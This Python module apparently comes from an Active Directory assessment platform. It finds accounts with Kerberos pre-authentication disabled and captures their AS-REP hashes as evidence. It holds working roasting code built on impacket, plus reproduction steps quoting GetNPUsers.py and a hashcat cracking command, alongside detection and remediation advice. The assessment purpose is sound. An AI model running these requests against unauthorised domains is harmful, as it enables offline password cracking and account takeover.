"""
ASREPRoastChecker — find accounts with Kerberos pre-authentication disabled and
capture their AS-REP hashes as *offline-cracking evidence only*.

AS-REP Roasting (MITRE T1558.004) targets accounts with the
``DONT_REQ_PREAUTH`` flag: the KDC will return an AS-REP encrypted with the
account's key without the requester proving knowledge of the password, so the
response can be cracked offline. This module captures the hash and stops — it
never cracks it.
"""
from __future__ import annotations

from typing import Any

import structlog

from app.ad.findings import build_ad_finding
from app.ad.ldap_enum import LDAPEnumerator
from app.models.enums import FindingSeverity

logger = structlog.get_logger()

try:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AS_REP
    from impacket.krb5.kerberosv5 import KerberosError, sendReceive
    from impacket.krb5.types import Principal

    _HAS_IMPACKET = True
except ImportError:  # pragma: no cover
    _HAS_IMPACKET = False


class ASREPRoastChecker:
    """Enumerate AS-REP roastable accounts and capture AS-REP evidence."""

    MITRE = ["T1558.004"]
    CWE = "CWE-522"

    # ── get_no_preauth_accounts ───────────────────────────────────────────────────

    def get_no_preauth_accounts(self, ldap_conn: LDAPEnumerator) -> list[str]:
        """Usernames of enabled accounts with pre-authentication not required."""
        accounts = [
            u.samaccountname
            for u in ldap_conn.get_users()
            if u.no_preauth and u.enabled and u.samaccountname
        ]
        logger.info("ad.asreproast.accounts", count=len(accounts))
        return accounts

    # ── request_asrep ─────────────────────────────────────────────────────────────

    def request_asrep(self, username: str, dc_ip: str, domain: str) -> str | None:
        """
        Request an AS-REP for ``username`` with no credentials and return the
        $krb5asrep$ hash for offline cracking evidence. Returns None on failure or
        if impacket is missing. Does NOT crack the hash.

        We send a credential-less AS-REQ via impacket's ``getKerberosTGT``. For a
        pre-auth-disabled account the KDC returns the encrypted AS-REP, which
        impacket surfaces; we extract and format the hash without ever attempting
        to decrypt it.
        """
        if not _HAS_IMPACKET:
            logger.warning("ad.asreproast.no_impacket", hint="pip install impacket")
            return None

        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT

            client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            # Empty password: the KDC skips pre-auth for DONT_REQ_PREAUTH accounts
            # and returns an AS-REP whose enc-part is the roastable material.
            tgt, _cipher, _old_sk, _sk = getKerberosTGT(
                client, "", domain, "", "", None, dc_ip
            )
            return self._format_asrep_hash(username, domain, tgt)
        except KerberosError as exc:
            text = str(exc)
            if "$krb5asrep$" in text:
                return text[text.index("$krb5asrep$"):].split()[0]
            logger.info("ad.asreproast.not_roastable", username=username, detail=text[:120])
            return None
        except Exception as exc:
            logger.warning("ad.asreproast.request_failed", username=username, error=str(exc))
            return None

    @staticmethod
    def _format_asrep_hash(username: str, domain: str, as_rep_bytes: Any) -> str | None:
        """Render an AS-REP as a hashcat $krb5asrep$ string (no decryption)."""
        try:
            from pyasn1.codec.der import decoder

            decoded = decoder.decode(as_rep_bytes, asn1Spec=AS_REP())[0]
            etype = int(decoded["enc-part"]["etype"])
            cipher = bytes(decoded["enc-part"]["cipher"])
            checksum = cipher[:16].hex()
            edata = cipher[16:].hex()
            return f"$krb5asrep${etype}${username}@{domain.upper()}:{checksum}${edata}"
        except Exception:
            return None

    # ── generate_finding ──────────────────────────────────────────────────────────

    def generate_finding(self, accounts: list[str]) -> dict[str, Any] | None:
        if not accounts:
            return None

        names = ", ".join(accounts[:10])
        return build_ad_finding(
            title=f"AS-REP roastable accounts (pre-auth disabled) — {len(accounts)}",
            severity=FindingSeverity.high,
            description=(
                "One or more domain accounts have Kerberos pre-authentication "
                "disabled (DONT_REQ_PREAUTH). An unauthenticated attacker who knows "
                "the username can request an AS-REP and crack it offline to recover "
                f"the account password. Affected accounts: {names}"
            ),
            mitre_techniques=self.MITRE,
            cwe=self.CWE,
            reproduction=[
                "Obtain a list of valid usernames (or enumerate via the DC).",
                "Request AS-REP hashes: GetNPUsers.py 'DOMAIN/' -usersfile users.txt -dc-ip <DC> -no-pass",
                "Save the $krb5asrep$ hashes (captured here as evidence).",
                "Crack offline (out of scope for this platform): hashcat -m 18200 asrep.hash wordlist",
            ],
            detection_opportunity=(
                "Alert on Kerberos AS-REQ (Event ID 4768) with pre-authentication "
                "type 0 / failure code 0x19, and audit accounts with "
                "DONT_REQ_PREAUTH set."
            ),
            remediation=(
                "Re-enable Kerberos pre-authentication on all accounts "
                "(clear 'Do not require Kerberos preauthentication'). If a legacy "
                "system genuinely requires it, isolate the account and enforce a "
                "long, random password with AES encryption."
            ),
            exploitable=True,
            evidence_extra={
                "accounts": accounts,
                "note": "AS-REP hashes captured as evidence only — not cracked by this platform.",
            },
        )
